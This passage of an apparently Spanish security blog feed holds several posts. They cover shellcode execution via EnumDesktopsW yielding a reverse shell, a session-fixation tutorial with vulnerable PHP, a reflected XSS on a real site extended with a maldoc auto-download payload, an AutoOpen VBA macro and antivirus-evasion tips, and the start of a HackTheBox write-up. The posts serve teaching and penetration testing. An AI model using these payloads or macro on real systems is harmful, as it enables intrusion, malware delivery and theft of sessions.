<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="n">CreateDesktopW</span><span class="p">(</span><span class="s">L"ShellcodeDesk"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Creara un nuevo escritorio llamado “ShellcodeDesk” donde se le da acceso “GENERIC_ALL” para tener control total de ese ecritorio, y ojo,
para windows los escritorios solo son objetos que representan un area virtual la cual ejecuta aplicaciones y tiene ventanas, cada escritorio
esta aislado de otro escritorio, es decir, que cada escritorio tiene sus ventanas, aplicaciones.</p>

<p>Como curiosidad, la creacion de escritorios esta limitada por el tamaño del heap del escritorio del sistema, el cual es de 48 MB</p>

<p>Y si ese escritorio se crea, osea es diferente de NULL, regresa un identificador que se guarda en <code class="language-plaintext highlighter-rouge">hDesktop</code>, y pasara a la funcion CreateThread()</p>

<h4 id="createthread">CreateThread()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SwitchDesktopThread</span><span class="p">,</span> <span class="n">hDesktop</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Ahora, cuando se hace un llamado a esta funcion lo que esta pasando es que crea un hilo en el proceso actual, y date cuenta que este hilo su tercer parametro es un puntero del nombre de la funcion que se va a ejecutar en ese hilo, osea <code class="language-plaintext highlighter-rouge">SwitchDesktopThread</code>, tambien se le pasa <code class="language-plaintext highlighter-rouge">hDesktop</code> que es la variable que tiene el escritorio creado con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code></p>

<h4 id="switchdesktopthread">SwitchDesktopThread()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">SwitchDesktopThread</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">){</span>
    <span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="n">HDESK</span><span class="o">&gt;</span><span class="p">(</span><span class="n">lpParameter</span><span class="p">);</span>
    <span class="n">SetThreadDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ahora con <code class="language-plaintext highlighter-rouge">SwitchDesktopThread</code> lo que esta haciendo es cambiar al escritorio creado con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code> mediante <code class="language-plaintext highlighter-rouge">SetThreadDesktop()</code>, sin embargo este cambio lo hace asignando el escritorio creado al hilo al que pertenece o del cual se esta ejecutando, osea, el escritorio “ShellcodeDesk” que se creo con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code> se estaria ejecutando en el hilo creado con <code class="language-plaintext highlighter-rouge">CreateThread</code>, por eso mismo, en uno de los parametros de <code class="language-plaintext highlighter-rouge">CreateThread</code> se le pasa <code class="language-plaintext highlighter-rouge">hDesktop</code>, que es la variable que tiene el nombre de escritorio “ShellcodeDesk”.</p>

<h4 id="ejecucion-de-la-shellcode">Ejecucion de la shellcode</h4>

<p>Y en caso de que todo vaya bien todas las intrucciones que le siguen se estarian ejecutando en ese escritorio (“ShellcodeDesk”) lo cual permite que esten aisladas del escritorio actual del usuario, y ya al final con <code class="language-plaintext highlighter-rouge">EnumDesktopsW()</code> se ejecuta las shellcode en el contexto del escritorio creado, osea ShellcodeDesk</p>

<h4 id="resultados">Resultados</h4>

<p>Llega una reverse shell por que eso es lo que hace la shellcode</p>

<p><img src="/assets/img/enumDesktopW/1.png" alt="" /></p>

<p><img src="/assets/img/enumDesktopW/2.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer ❤</p>]]></content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html"><![CDATA[Te explicare como use la funcion EnumDesktopsW() para ejecutar una shellcode en un escritorio creado con CreateDesktopW() EnumDesktopsW]]></summary></entry><entry><title type="html">Un Poco de Pentesting - Session Fixation</title><link href="http://localhost:4000/un%20poco%20de%20pentesting/2023/07/05/UPDP-session-fixation.html" rel="alternate" type="text/html" title="Un Poco de Pentesting - Session Fixation" /><published>2023-07-05T00:00:00-06:00</published><updated>2023-07-05T00:00:00-06:00</updated><id>http://localhost:4000/un%20poco%20de%20pentesting/2023/07/05/UPDP-session-fixation</id><content type="html" xml:base="http://localhost:4000/un%20poco%20de%20pentesting/2023/07/05/UPDP-session-fixation.html"><![CDATA[<p class="lead">Te explicare como funciona el ataque Session Fixation con el que podremos robar/secuestrar la sesion de otra persona</p>

<h2 id="sesiones">Sesiones</h2>

<p>De acuerdo a google las sesiones son:</p>

<blockquote>
  <p>Una sesion de un grupo de interacciones del usuario con un sitio web que tienen lugar dentro de un marco de tiempo determinado, Por ejemplo, una sola sesion puede contener varias vistas de pagina, eventos, interacciones sociales y transacciones de comercio electronico.</p>
</blockquote>

<p><img src="https://lh3.googleusercontent.com/jYib9rNgrLOavCGfEaMPqJNOIf6cN5aHqsZpXAKPP1IVOUM3iFImIIxMW_AnWHlI5xKJ=w1100" alt="" /></p>
<center>Imagen de: Google Analytics</center>

<p>Y es correcto, en una sesion se puede almacenar informacion sobre lo que un usuario hizo en un sitio web, ademas cabe recalcar que la sesion se crea una vez que primero el usuario se haya autenticado en el sitio web, por lo regular duran 30 minutos o hasta media noche (esto puede varias si el programador lo desea)</p>

<h3 id="session-authentication">Session Authentication</h3>

<p>La autenticacion basada en sesiones es un metodo para crear una sesion para cada usuario que se haya autenticado donde se almacenada informacion del lado del servidor en un “session ID”.</p>

<p><strong>Funciona de esta manera:</strong></p>

<ol>
  <li>
    <p>El cliente envia una solicitud de inicio de sesion o alguna informacion que pida</p>
  </li>
  <li>
    <p>El servidor autentica al usuario, crea una sesion que contendra la informacion de inicio de sesion u otra que haya pedido (se almacena en la base de datos y devuelve un session ID)</p>
  </li>
  <li>
    <p>El cliente cuando vuelva a conectarse envia el sessionID en los encabezados de peticion</p>
  </li>
  <li>
    <p>El servidor comprueba si el sessionID que le envio el cliente tiene informacion valida, en caso de que sea exitoso el servidor web autentica el usuario</p>
  </li>
</ol>

<p><strong>Ejemplos de encabezados HTTP:</strong></p>

<ul>
  <li>
    <p>Encabezado de respuesta</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HTTP/1.1 200 OK
  Content-Type: text/html
  Set-Cookie: <span class="nv">SESSIONID</span><span class="o">=</span>identificador_de_sesion
</code></pre></div>    </div>
    <p>Observa como a travez del header <code class="language-plaintext highlighter-rouge">Set-Cookie</code> el servidor le asigno al usuario una sesion con su identificacion</p>
  </li>
  <li>
    <p>Encabezado de peticion</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  GET /recurso HTTP/1.1
  Host: ic4rta.github.io
  Cookie: <span class="nv">SESSIONID</span><span class="o">=</span>identificador_de_sesion
</code></pre></div>    </div>
    <p>Observa que cuando se hace una peticion, en el header <code class="language-plaintext highlighter-rouge">Cookie</code> se le debe de indicar el session ID con su identificador</p>
  </li>
</ul>

<h2 id="session-fixation">Session Fixation</h2>

<p>El session fixation es una tecnica donde se obliga a usar a la victima a usar un <code class="language-plaintext highlighter-rouge">session ID</code> creado por el atacante con el fun de que la victima se autentique usando ese mismo <code class="language-plaintext highlighter-rouge">session ID</code>, y el atacante pueda usar ese mismo <code class="language-plaintext highlighter-rouge">session ID</code> para iniciar sesion como si fuera la victima.
Y ya con esto el atacante pudo robar/secuestrar la sesion de la victima</p>

<p>Algunas consideraciones son que:</p>

<ul>
  <li>El atacante cree un <code class="language-plaintext highlighter-rouge">session ID</code> valido</li>
  <li>El ataque comienza antes de que la victima inicie sesion en el sitio web</li>
</ul>

<h3 id="ejemplo">Ejemplo</h3>

<p><img src="https://compsecurityconcepts.files.wordpress.com/2013/11/session-fixation.png" alt="" /></p>

<center>Imagen de: IT Security Concepts Wordpress</center>

<ol>
  <li>
    <p>El atacante inicia sesión en el banco</p>
  </li>
  <li>
    <p>El servidor a travez de los encabezados de respuesta le asigna un session ID el cual es válido (session ID: 2435345)</p>
  </li>
  <li>
    <p>El atacante le envía una URL a la víctima con el session ID que generó el atacante</p>
  </li>
  <li>
    <p>La víctima entra a la URL</p>
  </li>
  <li>
    <p>La víctima se auténtica usando el session ID del atacante(session ID: 2435345) e inicia sesión usando sus credenciales, y ahora ese session ID ya tiene información de la sesión de la víctima (las credenciales en este caso, pero puede tener más cosas)</p>
  </li>
  <li>
    <p>El atacante puede usar ese session ID para iniciar sesión en la cuenta de la víctima</p>
  </li>
</ol>

<p><strong>Ejemplo de codigo vulnerable:</strong></p>

<p>Es un ejemplo clasico</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'SESSIONID'</span><span class="o">]))</span> 
  <span class="o">{</span>
    session_id<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'SESSIONID'</span><span class="o">])</span><span class="p">;</span>
  <span class="o">}</span>
  <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'logged_in'</span><span class="o">]</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Primero con <code class="language-plaintext highlighter-rouge">if (isset($_GET['SESSIONID']))</code> verifica si existe <code class="language-plaintext highlighter-rouge">SESSIONID</code> en la URL, asi que esta esperando a que el usuario especifique un session ID por la query string, esa es una parte de la vulnerabilidad por que se le esta permitiendo a un atacante establecer su propio session ID</p>
  </li>
  <li>
    <p>Despues con <code class="language-plaintext highlighter-rouge">session_id($_GET['SESSIONID'])</code> establece ese session ID de la query string como el ID se sesion actual, y esa es la otra parte de la vulnerabilidad, por que si el atacente le envia una URL como esta a la victima: <code class="language-plaintext highlighter-rouge">http://localhost:3000/login?SESSIONID=aaaaa</code>, lo que va a pasar es que la victima al entrar al URL, tomara ese session ID como suyo, permitiendo que el atacante y la victima tengan los mismos session ID</p>
  </li>
  <li>
    <p>Al final con <code class="language-plaintext highlighter-rouge">$_SESSION['logged_in'] = true</code> simplemente es para decir si el usuario esa autenticado</p>
  </li>
</ul>

<h3 id="testeando-con-burp-suite">Testeando con Burp Suite</h3>

<p>Vamos a establecer esta regla para decir que intercepte cuando la peticion fue interceptada</p>

<p><img src="/assets/img/session-fixation/0.png" alt="" /></p>

<p>Tendremos que hacer una peticion al sitio web que queremos testear</p>

<p><img src="/assets/img/session-fixation/1.png" alt="" /></p>

<p>Date cuenta que el sitio web aun no nos asigna un sessionID, pero al darle <code class="language-plaintext highlighter-rouge">forward</code> en el burp obtendremos la respuesta</p>

<p><img src="/assets/img/session-fixation/2.png" alt="" /></p>

<p>Obverva como ya el servidor web nos asigno un sessionID, pero ojo, ese sesisionID se asigno antes de que iniciara sesion el usuario, asi que en este momento entraria el atacante que podria establecer un session ID que el haya generado, todo esto antes de que la victima inicie sesion y se autentique, Entonces estableceremos otro sessionID:</p>

<p><img src="/assets/img/session-fixation/3.png" alt="" /></p>

<p>Una vez que le <code class="language-plaintext highlighter-rouge">forward</code> en el burp suite, ese session ID se va a establecer como el session ID de la victima antes de que inicie sesion, de hecho si vemos en el sitio web de ejemplo tenemos que antes de iniciar sesion, en las cookies nos sale ese session ID</p>

<p><img src="/assets/img/session-fixation/4.png" alt="" /></p>

<p>Y una vez que el usuario haya iniciado sesion, lo estaria haciendo con ese session ID que establecimos, y en las cookies lo comprobamos</p>

<p><img src="/assets/img/session-fixation/5.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p>Referencias:</p>

<ul>
  <li><a href="https://owasp.org/www-community/attacks/Session_fixation">https://owasp.org/www-community/attacks/Session_fixation</a></li>
  <li><a href="https://secureteam.co.uk/articles/web-application-security-articles/understanding-session-fixation-attacks/">https://secureteam.co.uk/articles/web-application-security-articles/understanding-session-fixation-attacks/</a></li>
</ul>]]></content><author><name>c4rta</name></author><category term="Un Poco de Pentesting" /><category term="Session Fixation" /><summary type="html"><![CDATA[Te explicare como funciona el ataque Session Fixation con el que podremos robar/secuestrar la sesion de otra persona]]></summary></entry><entry><title type="html">Simple XSS reflejado en un sitio web real</title><link href="http://localhost:4000/2023/06/28/xxs-reflejado.html" rel="alternate" type="text/html" title="Simple XSS reflejado en un sitio web real" /><published>2023-06-28T00:00:00-06:00</published><updated>2023-06-28T00:00:00-06:00</updated><id>http://localhost:4000/2023/06/28/xxs-reflejado</id><content type="html" xml:base="http://localhost:4000/2023/06/28/xxs-reflejado.html"><![CDATA[<p>Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real</p>

<p class="lead"><strong>Este no es ningun writeup, pero te voy a mostrar como encontre de casualidad una vulnerabilidad <code class="language-plaintext highlighter-rouge">XSS reflejado</code> en un sitio web real, cabe recalcar que la vulnerabilidad ya la reporte, y no estoy promoviendo explotar vulnerabilidades en entornos reales, y simplemente te voy a dar la idea de algo que podria hacer alguien con malas intenciones, que este no es el caso, y espero que el tuyo tampoco</strong></p>

<h2 id="xss-reflejado">XSS reflejado</h2>

<p>De acuerdo a port swigger se trata de:</p>

<blockquote>
  <p>Surge cuando una aplicación recibe datos en una solicitud HTTP e incluye esos datos en la respuesta inmediata de forma no segura</p>
</blockquote>

<p>Es decir que en un XSS reflejado los datos que mándamos por una petición HTTP se reflejan en la respuesta que da el servidor web hacia el cliente (navegador)</p>

<p>Cómo dice OWASP:</p>

<blockquote>
  <p>El ataque se lleva a cabo a través de un único ciclo de solicitud/respuesta.</p>
</blockquote>

<p>En este tipo de XSS el codigo no reside en la aplicacion web como tal y no se encuentra del lado del servidor, y regularmente un atacante puede incrustar su payload malicioso en la URL generada y enviarselo a la victima, obvio se usa ingenieria social y phishing para que sea mas creible.</p>

<h2 id="identificando-el-xss">Identificando el XSS</h2>

<blockquote>
  <p>Evidentemente voy se censurar la URL</p>
</blockquote>

<p><strong>¿Como me di cuenta que era un XSS?</strong></p>

<p>Fue muy random, originalmente yo solo queria buscar una noticia, entonces use su barra de busqueda para encontrar lo que queria, cuando busque por un termino me di cuenta de la forma tan peculiar de la URL y como se mostraban los datos en la pagina, mira:</p>

<p><img src="/assets/img/simple_xss/1.png" alt="" /></p>

<p>Vean como cuando se realiza una busqueda, te manda a la ruta <code class="language-plaintext highlighter-rouge">/buscar/</code> la cual tiene un parametro de consulta el cual es la <code class="language-plaintext highlighter-rouge">q</code>, como se ve en <code class="language-plaintext highlighter-rouge">?q=c4rta</code>, asi que el parametro <code class="language-plaintext highlighter-rouge">q</code> es utilizado para especificar el termino que se quiere buscar, y del lado de la pagina web, el termino que busque se refleja en la pagina web</p>

<p><img src="/assets/img/simple_xss/2.png" alt="" /></p>

<p>Esto ya estaba curioso, asi que decidi mostrar el codigo fuente de la pagina cuando se realiza la busqueda, y por suerte encontre la funcion que realiza la busqueda</p>

<p><img src="/assets/img/simple_xss/3_000.png" alt="" /></p>

<p>Primero con:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">searchString</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">searchtextsimple</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</code></pre></div></div>
<p>Lo que esta haciendo es crear una variable llamada <code class="language-plaintext highlighter-rouge">searchString</code> la cual va a contener el valor del atributo <code class="language-plaintext highlighter-rouge">value</code> del elemento con el id <code class="language-plaintext highlighter-rouge">searchtextsimple</code>, y ese elemento con el id es este:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"searchtextsimple"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Buscar"</span> <span class="na">value=</span><span class="s">"c4rta"</span><span class="nt">&gt;&lt;/input&gt;</span>
</code></pre></div></div>

<p>Despues en el JS tenemos que nuestro input el cual esta guardado en <code class="language-plaintext highlighter-rouge">searchString</code> se le concatena sin ningun tipo de procesamiento ni sanitizacion a la URL a tra vez del parametro <code class="language-plaintext highlighter-rouge">q</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://&lt;URL&gt;/barebone/wf.template/config.default.master.withgroupcount?q=</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">encodeURI</span><span class="p">(</span><span class="nx">searchString</span><span class="p">);</span>
</code></pre></div></div>

<p>Y por ultimo carga la URL para mostrarla en la web:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.results-group.parent</span><span class="dl">"</span><span class="p">).</span><span class="nf">load</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
</code></pre></div></div>

<p>Entonces tenemos que nuestro input se guarda en al atributo <code class="language-plaintext highlighter-rouge">value</code> de  la etiqueta <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> y despues se extrae y se concatena directamente en la URL para luego ser interpretado por el sitio web, la vulnerabilidad es obvia, al yo tener control total de lo que quiero buscar y este sera interpretado, entonces puedo probar por XSS a ver si interpreta codigo de JS, ahora le ingresare esto como input:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Prueba XSS</span><span class="dl">"</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Y vean como si nos interpreta el JS y ya nos dimos cuenta que tenemos un XSS reflejado</p>

<p><img src="/assets/img/simple_xss/4.png" alt="" /></p>

<p>Y en la URL se incrusto el codigo de XSS</p>

<p><img src="/assets/img/simple_xss/5.png" alt="" /></p>

<p>Podria usar otro payload para obtener las cookies, y curiosamente este sitio web tiene un monton</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>
<center><img src="/assets/img/simple_xss/6.png" width="290px" height="200px" /></center>
<p><br /></p>

<p>Evidentemente censure todo por que sale mi cookie de sesion asi como otras muchas, y es posible que hayas pensado que este XSS una vez teniendo la cookie de sesion podria conducir a un CSRF/XSRF, y es correcto mientras sea vulnerable a ello. pero este vez vamos a ir mas alla, por que este XSS lo vamos combinar con malware, mas en concreto algo que se le conoce como <code class="language-plaintext highlighter-rouge">MalDoc</code></p>

<h2 id="maldoc">MalDoc</h2>

<p>MalDoc viene de Malicious Document, y lo que podria hacer ahora es crear una macro en VBS la cual vamos a incrustar en un docx, donde la macro se ejecutara automaticamente al abrirse el documento, y vamos a aprovechar el XSS para crear un payload que al entrar a la URL vulnerable a XSS, se descargue automaticamente el documento de una URL creada por el atacante, el payload es el siguiente:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> 
    <span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">link</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">URL:8080/MalDoc.docx</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">link</span><span class="p">.</span><span class="nx">download</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">MalDoc.docx</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">link</span><span class="p">.</span><span class="nf">click</span><span class="p">();</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Basicamente el escenario seria que nosotros como atacantes le mandemos a la victima la URL del sitio vulnerable con el payload, la victima abra la URL, se descargue automaticamente el docx, se redireccione al sitio original de la pagina vulnerable, la victima abra el documento que contiene una macro, la macro se ejecute y ejecuta un comando que podria ser una reverse shell</p>

<p>Esto pasaria si la victima abre el link con el payload:</p>

<p><img src="/assets/img/simple_xss/7.png" alt="" /></p>

<p>Vean como la URL tiene el payload, y el entrar al link, se descargar automaticamente el documento del sitio web del atacante, en este caso, es un servidor web que cree con python y que tiene mi IPv4.</p>

<p>Y entonces al abrirlo se deberia de ejecutar la macro con la reverse shell, pero ¿Como se crea la macro?, bueno, el msfvenom ya tiene modulos para crear un MalDoc y una macro maliciosa, pero estamos aprendiendo, hay que hacerlo manual, simplemente de voy a dar la idea, no lo voy a poner a prueba.</p>

<p>Podriamos crear un archivo VBS de esta manera:</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
<span class="n">Comando_Ps</span> <span class="o">=</span> <span class="s">"el tipico oneliner de powershell"</span>

<span class="k">Dim</span> <span class="nv">Shell</span> <span class="ow">As</span> <span class="kt">Object</span>
<span class="k">Set</span> <span class="n">Shell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="n">Shell</span><span class="p">.</span><span class="n">Run</span> <span class="p">(</span><span class="n">Comando_Ps</span><span class="p">)</span>

<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>

<p>Basicamente lo que va a hacer es ejecutar un comando de powershell que se declare en la variable <code class="language-plaintext highlighter-rouge">Comando_Ps</code> a tra vez de un objeto <code class="language-plaintext highlighter-rouge">Wscript.Shell</code></p>

<p>Y ahora para incrustarla en el docuemento se puede hacer uso de <code class="language-plaintext highlighter-rouge">Microsoft Visual Basic for Applications</code> y guardar el documento con la macro.</p>

<p>Y seguramente diras: “Eso no evade ningun antivirus, y el defender lo va a detectar”, y en efecto, asi que te dare unos tips</p>

<ul>
  <li>Usa Invoke-Obfuscation</li>
  <li>Usa procesos VMI</li>
  <li>Usa StrRerverse() para agregar un poco mas de ofuscacion</li>
  <li>Usa WMI Win32_PingStatus para evadir sandboxes</li>
</ul>

<p>(Estas tecnicas que acabe de mencionar, como lo de MalDoc con la macro y las tecnicas para evadir antivirus pienso dedicarles un post aparte)</p>

<blockquote>
  <p>Recuerda que la vulnerabilidad ya esta reportada, y no estoy promoviendo la creacion de malware ni tampoco el explotar vulnerabilidades sin el permisos de otros, es meramente educativo e informativo.</p>
</blockquote>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/simple_xss/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="XSS" /><summary type="html"><![CDATA[Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real]]></summary></entry><entry><title type="html">HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML</title><link href="http://localhost:4000/hackthebox/2023/06/26/htb-jupiter.html" rel="alternate" type="text/html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML" /><published>2023-06-26T00:00:00-06:00</published><updated>2023-06-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/2023/06/26/htb-jupiter</id><content type="html" xml:base="http://localhost:4000/hackthebox/2023/06/26/htb-jupiter.html"><![CDATA[<p>Descubriremos un subdomino el cual hace uso de grafana y su API, para la intrusion haremos un SQLi a RCE usando un ruta de la API para realizar consultar, despues haremos movimiento lateral mediante un archivo YAML, despues otro movimiento lateral usando Jupyter el cual nos permitira ejecutar comando y mandarnos una rev shell, y para root abusaremos de un binario donde le indicaremos que descargue el archivo de la flag y lo guarde en un directorio dentro de /tmp</p>

<h2 class="lead" id="enumeracion">Enumeracion</h2>

<p>Iniciamos con un escaneo de nmap con:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -n -Pn -T4 --open -p- 10.10.11.216
</code></pre></div></div>

<ul>
  <li>
    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
  </li>
  <li>
    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
  </li>
  <li>
    <p>Pn: para evitar el descubrimiento de hosts</p>
  </li>
  <li>
    <p>open: para que solo muestre los puertos abiertos</p>
  </li>
  <li>
    <p>-p-: para que escanee todo el rango de puertos</p>
  </li>
</ul>

<p>Y nos reporto que hay dos puertos abiertos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80 10.10.11.216
</code></pre></div></div>
<p>Vemos que por el puerto 80 nos dice que nos redirecciona a <code class="language-plaintext highlighter-rouge">jupiter.htb</code>, asi que debemos de agregar ese dominio al /etc/hosts</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p>Al explorar la web principal no encontraremos nada que nos interese, asi que toca hacer fuzzing</p>

<h3 id="fuzzing-de-subdominios">Fuzzing de subdominios</h3>

<p>Si hacemos fuzzing de directorios para ver descubrir rutas:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -u 'http://jupiter.htb/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=404
</code></pre></div></div>

<p>Nos mostrara que existen varias rutas, pero ninguna es de interes, asi que probaremos con subdominios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-u</span> <span class="s1">'http://jupiter.htb'</span> <span class="nt">-H</span> <span class="s1">'Host: FUZZ.jupiter.htb'</span> <span class="nt">-t</span> 100 <span class="nt">-w</span> /usr/share/wordlists/directory-list-2.3-medium.txt <span class="nt">--hh</span><span class="o">=</span>178 <span class="nt">--hc</span><span class="o">=</span>404
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://jupiter.htb/
Total requests: 220560

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                                                                 
<span class="o">=====================================================================</span>

000000007:   400        7 L      12 W       166 Ch      <span class="s2">"# license, visit http://creativecommons.org/licenses/by-sa/3.0/"</span>                                       
000000009:   400        7 L      12 W       166 Ch      <span class="s2">"# Suite 300, San Francisco, California, 94105, USA."</span>                                                   
000013173:   200        211 L    798 W      34390 Ch    <span class="s2">"kiosk"</span>                                                                                                 
000162619:   200        211 L    798 W      34390 Ch    <span class="s2">"Kiosk"</span> 
</code></pre></div></div>

<p>Y logramos encontrar el de <code class="language-plaintext highlighter-rouge">kiosk</code>, asi que tambien lo agregamos al /etc/hosts</p>

<h3 id="investigando-kioskjupiterhtb">Investigando kiosk.jupiter.htb</h3>

<p>Cuando entramos a la web por primera vez vamos a poder ver que esta haciendo uso de grafana, incluso por unos segundos podemos ver en el <code class="language-plaintext highlighter-rouge">title</code> de la pagina que se esta usando grafana, basicamente grafana es un software para el analisis y monitoreo de datos metricos, grafana tambien dispone de una API, asi que es muy posible que se este usando para realizar cosas por detras, si entramos a la pagina web encontraremos un dashboard donde veremos la cantidad de lunas de los planetas</p>

<p><img src="/assets/img/jupiter/1.png" alt="" /></p>

<p>Si exploramos un poco, nos deremos cuenta que en cada seccion que contiene la informacion de los planetas y las lunas, se encuentra un pequeño menu, donde podemos encontrar mas informacion</p>

<p><img src="/assets/img/jupiter/2.png" alt="" /></p>

<p>Si le damos en inspeccionar y en panel JSON, podemos ver esto todo esto:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
